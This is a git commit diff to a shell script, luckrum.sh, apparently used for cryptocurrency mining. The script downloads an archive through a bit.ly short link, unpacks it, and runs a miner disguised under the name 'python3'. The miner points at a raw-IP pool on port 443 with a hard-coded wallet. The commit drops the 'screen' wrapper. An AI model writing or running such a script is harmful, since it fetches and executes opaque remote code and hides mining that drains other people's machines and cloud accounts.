bc0435eb89b838fb2b9becac6870a24b5aec2b77
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-06-10 10:11:48 +0700

    Update luckrum.sh

--- luckrum.sh
+++ luckrum.sh
@@ -1,5 +1,3 @@
-apt install screen -y
-
 wget https://bit.ly/kontolrum
 
 tar -xvf kontolrum
@@ -12,4 +10,4 @@ nomer=$((RANDOM % 50 + 1))
 
 clear
 
-screen ./python3 --algorithm aurum --pool 103.120.18.210:443 --wallet waf1qd2ect4ut9nqq8w54ymsuxfh0ea93zjkkhyyu74.DOT-0$nomer --keepalive true 
+./python3 --algorithm aurum --pool 103.120.18.210:443 --wallet waf1qd2ect4ut9nqq8w54ymsuxfh0ea93zjkkhyyu74.DOT-0$nomer --keepalive true 
